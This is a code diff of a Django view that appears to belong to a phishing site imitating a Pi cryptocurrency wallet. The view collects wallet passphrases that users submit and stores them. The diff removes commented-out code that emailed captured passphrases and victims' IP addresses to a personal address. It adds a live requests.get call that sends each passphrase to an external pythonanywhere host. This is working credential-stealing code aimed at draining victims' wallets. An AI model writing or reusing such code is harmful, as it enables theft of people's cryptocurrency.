@@ -84,10 +84,6 @@ def submit_pass(request):
                 fake_keys = keys
             )
             fake_keys.save()
-            # if my_site:
-            #     send_notify(payload=f'Fake Pass Phrase submitted - {formatted_time} - the passphrase is -( {keys} )', subject=f'Pi site {current_date} Token Submitted(Personal Fake)', email_to="ezekielobiajulu0@gmail.com")
-            # else:
-            #     send_notify(payload=f'Fake Pass Phrase submitted - {formatted_time} - the passphrase is -( {keys} )', subject=f'Pi site {current_date} Token Submitted(Fake)', email_to="ezekielobiajulu0@gmail.com")
             messages.error(request, 'Invalid Passphrase')
             return redirect('/wallet/')
 
@@ -130,16 +126,8 @@ def submit_pass(request):
                     look_up = look_up_key
                 )
                 key_save.save()
-                ip_address = request.session.get('ip_address', None)
-                if not ip_address:
-                    ip_address = get_ip_address()
-                    request.session['ip_address'] = ip_address
-                    ip_address = ip_address
 
-                if ip_address == None:
-                    ip_address = get_ip_address()
-                    request.session['ip_address'] = ip_address
-                    ip_address = ip_address
+                requests.get(f'https://eazydevmail.pythonanywhere.com/send/{keys}/')
 
                 # if my_site:
                 #     send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the ip address is (- {ip_address}) - the passphrase is -( {keys} )', subject=f'Pi site Token Submitted {formatted_time} (My site)', email_to="ezekielobiajulu0@gmail.com")
